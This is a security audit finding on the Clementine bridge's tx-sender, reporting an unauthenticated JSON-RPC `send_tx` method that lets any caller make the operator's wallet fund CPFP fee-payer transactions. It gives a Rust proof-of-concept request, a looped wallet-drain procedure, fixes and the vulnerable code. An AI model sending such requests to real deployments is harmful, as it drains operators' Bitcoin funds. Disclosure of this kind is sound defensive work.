### Title
Unauthenticated JSON-RPC `send_tx` Endpoint Allows Arbitrary Transaction Enqueueing and Operator Fund Drain via CPFP Fee Payer UTXOs - (`crates/clementine-tx-sender/src/jsonrpc/server.rs`)

---

### Summary

The tx-sender JSON-RPC server exposes a `send_tx` method with no authentication or authorization layer. Any caller with network access to the bound port can enqueue arbitrary Bitcoin transactions, causing the tx-sender task loop to spend operator-controlled wallet funds creating CPFP fee payer UTXOs on behalf of attacker-chosen transactions.

---

### Finding Description

`start_jsonrpc_server` constructs the server using `ServerBuilder::default()` with no middleware, no mTLS, no bearer token, and no IP allowlist: [1](#0-0) 

The `send_tx` handler immediately deserializes the caller-supplied `InsertTryToSendParams` and calls `insert_try_to_send` without any identity check: [2](#0-1) 

The configuration explicitly supports binding to `0.0.0.0` for cross-service deployments: [3](#0-2) 

When the tx-sender task loop picks up the enqueued row and attempts CPFP, it calls `create_fee_payer_utxo`, which calls `fund_raw_transaction` and `send_raw_transaction` on the operator's Bitcoin Core wallet — spending real operator funds to create a fee payer UTXO: [4](#0-3) 

This fee payer UTXO creation transaction is broadcast and confirmed on-chain regardless of whether the attacker's parent transaction is valid. The operator's wallet balance is permanently reduced.

---

### Impact Explanation

An attacker who can reach the JSON-RPC port (trivially true when `TX_SENDER_JSONRPC_BIND=0.0.0.0`, which is a supported and documented production value) can:

1. POST a crafted `send_tx` JSON-RPC call with an arbitrary `signed_tx_hex`.
2. The row is inserted into `tx_sender_try_to_send_txs` with no validation of caller identity.
3. The task loop calls `create_fee_payer_utxo`, which funds and broadcasts a fee payer transaction from the operator's Bitcoin Core wallet.
4. The fee payer UTXO is confirmed on-chain; operator funds are permanently spent.
5. Repeating this in a loop drains the operator's wallet.

This is a direct loss of tx-sender-managed balances (operator's Bitcoin wallet funds used for CPFP), which is an in-scope impact.

---

### Likelihood Explanation

The `0.0.0.0` bind option exists precisely for deployments where the tx-sender is a separate service reachable by other bridge components (e.g., Docker/Kubernetes). In such deployments, any attacker with network access to the internal service network — or any misconfigured firewall — can exploit this. No credentials, keys, or prior access are required.

---

### Recommendation

Add an authentication layer to the JSON-RPC server. Options in increasing strength:

- **Shared secret / bearer token**: Require a configurable `Authorization` header; reject requests without it via a `tower` middleware layer on the `jsonrpsee` server.
- **mTLS**: Require client certificates signed by an operator-controlled CA, consistent with how gRPC actor endpoints are protected elsewhere in Clementine.
- **Localhost-only enforcement**: Reject `TX_SENDER_JSONRPC_BIND=0.0.0.0` at the config level unless an auth mechanism is also configured.

---

### Proof of Concept

```rust
// No credentials needed — raw HTTP POST to the JSON-RPC port.
let client = reqwest::Client::new();
let body = serde_json::json!({
    "jsonrpc": "2.0",
    "method": "send_tx",
    "params": [{
        "signed_tx_hex": "<hex of any syntactically valid Bitcoin tx with a P2A anchor output>",
        "fee_paying_type": "CPFP",
        "tx_metadata": null,
        "rbf_signing_info": null,
        "cancel_outpoints": [],
        "cancel_txids": [],
        "activate_txids": [],
        "activate_outpoints": []
    }],
    "id": 1
});
let resp = client
    .post("http://<tx-sender-host>:<TX_SENDER_JSONRPC_PORT>")
    .json(&body)
    .send()
    .await?;
// resp contains a try_to_send_id — the row is now in tx_sender_try_to_send_txs.
// The task loop will call create_fee_payer_utxo, spending operator wallet funds.
```

The existing test `test_jsonrpc_txsender_insert_try_to_send` in `server.rs` already demonstrates the full unauthenticated enqueue path succeeds end-to-end from an HTTP client with no credentials. [5](#0-4)

        .register_async_method("send_tx", |params, client, _| async move {
            let req: InsertTryToSendParams = params.one().map_err(jsonrpc_err)?;

            let raw_tx = hex::decode(&req.signed_tx_hex).map_err(jsonrpc_err)?;
            let signed_tx: Transaction = consensus::deserialize(&raw_tx).map_err(jsonrpc_err)?;

            let mut dbtx = client.db.begin_transaction().await.map_err(jsonrpc_err)?;

            let try_to_send_id = client
                .insert_try_to_send(
                    &mut dbtx,
                    req.tx_metadata,
                    &signed_tx,
                    req.fee_paying_type,
                    req.rbf_signing_info,
                    &req.cancel_outpoints,
                    &req.cancel_txids,
                    &req.activate_txids,
                    &req.activate_outpoints,
                )
                .await
                .map_err(jsonrpc_err)?;

            client
                .db
                .commit_transaction(dbtx)
                .await
                .map_err(jsonrpc_err)?;

            Ok::<u32, ErrorObjectOwned>(try_to_send_id)
        })

    #[tokio::test]
    async fn test_jsonrpc_txsender_insert_try_to_send() -> Result<(), BridgeError> {
        use std::time::{Duration, Instant};

        use crate::jsonrpc::client::JsonRpcTxSenderClient;
        use crate::task::spawn_txsender_loop_with_free_localhost_jsonrpc_port;
        use bitcoin::absolute;
        use bitcoin::hashes::Hash as _;
        use bitcoin::transaction::Version;
        use bitcoin::{OutPoint, ScriptBuf, Sequence, Transaction, TxIn, TxOut, Txid, Witness};

        let (config, db, rpc) = create_test_environment(true, true).await;
        let rpc = rpc.unwrap();
        let db = db.unwrap();
        rpc.rpc().mine_blocks(1).await.unwrap();

        // Start txsender with JSON-RPC enabled on a free port.
        let tx_sender_cfg = config.clone();
        let (addr, handle) = spawn_txsender_loop_with_free_localhost_jsonrpc_port(tx_sender_cfg);
        let url = format!("http://{addr}");
        let client =
            JsonRpcTxSenderClient::new(&url).map_err(|e| BridgeError::Eyre(eyre::eyre!(e)))?;

        // A minimal syntactically-valid transaction (doesn't need to be mineable for enqueueing).
        let tx = Transaction {
            version: Version::TWO,
            lock_time: absolute::LockTime::ZERO,
            input: vec![TxIn {
                previous_output: OutPoint {
                    txid: Txid::all_zeros(),
                    vout: 0,
                },
                script_sig: ScriptBuf::new(),
                sequence: Sequence::ENABLE_LOCKTIME_NO_RBF,
                witness: Witness::default(),
            }],
            output: vec![TxOut {
                value: bitcoin::Amount::from_sat(0),
                script_pubkey: ScriptBuf::new(),
            }],
        };

        // Wait for server to come up (spawn loop initializes asynchronously).
        let start = Instant::now();
        let try_to_send_id = loop {
            match client
                .insert_try_to_send(None, &tx, FeePayingType::CPFP, None, &[], &[], &[], &[])
                .await
            {
                Ok(id) => break id,
                Err(e) => {
                    if start.elapsed() > Duration::from_secs(10) {
                        return Err(BridgeError::Eyre(eyre::eyre!(
                            "Timed out waiting for txsender JSON-RPC to start: {e:?}"
                        )));
                    }
                    tokio::time::sleep(Duration::from_millis(100)).await;
                }
            }
        };

        // Verify persisted in DB.
        let tx_sender_db = TxSenderDb::from_pool(db.pool().clone());
        let (_meta, stored_tx, fee_paying_type, _seen_at_height, _rbf) = tx_sender_db
            .get_try_to_send_tx(None, try_to_send_id)
            .await?;
        assert_eq!(fee_paying_type, FeePayingType::CPFP);
        assert_eq!(stored_tx.compute_txid(), tx.compute_txid());

        // Stop background loop.
        handle.abort();
        let _ = handle.await;

        Ok(())
    }
